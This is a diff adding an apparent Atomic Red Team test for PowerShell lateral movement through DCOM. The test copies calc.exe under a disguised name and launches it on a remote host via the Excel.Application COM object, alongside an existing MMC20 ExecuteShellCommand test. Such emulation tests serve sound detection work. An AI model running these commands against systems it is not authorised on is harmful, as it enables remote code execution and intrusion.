@@ -22,3 +22,43 @@ atomic_tests:
     command: |
       [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
     name: powershell
+- name: PowerShell Lateral Movement Using Excel Application Object
+  auto_generated_guid: 505f24be-1c11-4694-b614-e01ae1cd2570
+  description: |
+    Powershell lateral movement using the Excel COM objects.
+
+    Reference:
+
+    https://posts.specterops.io/lateral-movement-abuse-the-power-of-dcom-excel-application-3c016d0d9922
+
+    Upon successful execution, cmd will spawn calc.exe on a remote computer.
+  supported_platforms:
+  - windows
+  dependencies:
+  - description: |
+      Microsoft Excel must be installed
+    prereq_command: |
+      try {
+        New-Object -COMObject "Excel.Application" | Out-Null
+        Stop-Process -Name "Excel"
+        exit 0
+      } catch { exit 1 }
+    get_prereq_command: |
+      Write-Host "You will need to install Microsoft Excel manually to meet this requirement"
+    cleanup_command: |
+      Remove-Item 'C:\users\#{user}\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+  input_arguments:
+    computer_name:
+      description: Hostname or IP
+      type: string
+      default: localhost
+    user:
+      description: Name of user
+      type: string
+      default: admin
+  executor:
+    command: |
+      copy c:\windows\system32\calc.exe 'C:\users\#{user}\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+      $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","#{computer_name}"))
+      $com.ActivateMicrosoftApp("5")
+    name: powershell
